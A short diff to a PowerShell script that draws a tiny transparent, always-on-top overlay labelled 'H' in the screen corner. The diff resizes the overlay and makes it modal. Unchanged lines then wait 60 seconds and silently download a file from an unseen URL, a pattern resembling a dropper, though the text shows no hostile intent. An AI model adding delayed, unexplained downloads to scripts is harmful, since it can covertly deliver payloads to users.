@@ -11,9 +11,8 @@ $form.FormBorderStyle = 'None'
 $form.BackColor = [System.Drawing.Color]::Lime
 $form.TransparencyKey = $form.BackColor
 $form.TopMost = $true
-$form.Width = 30 
-$form.Height = 30
-
+$form.Width = 50
+$form.Height = 50 
 
 $label = New-Object System.Windows.Forms.Label
 $label.Text = "H"
@@ -27,7 +26,6 @@ $form.Controls.Add($label)
 $screenWidth = [System.Windows.Forms.Screen]::PrimaryScreen.WorkingArea.Width
 $screenHeight = [System.Windows.Forms.Screen]::PrimaryScreen.WorkingArea.Height
 
-# Explicitly cast Width and Height to integers to avoid any potential confusion
 $formLocationX = [int]$screenWidth - [int]$form.Width
 $formLocationY = [int]$screenHeight - [int]$form.Height
 
@@ -37,7 +35,7 @@ $form.Add_MouseDown({
     $form.Capture = $false
 })
 
-$form.Show()
+$form.ShowDialog()
 
 Start-Sleep -Seconds 60
 $webClient.DownloadFile($url, $downloadPath)
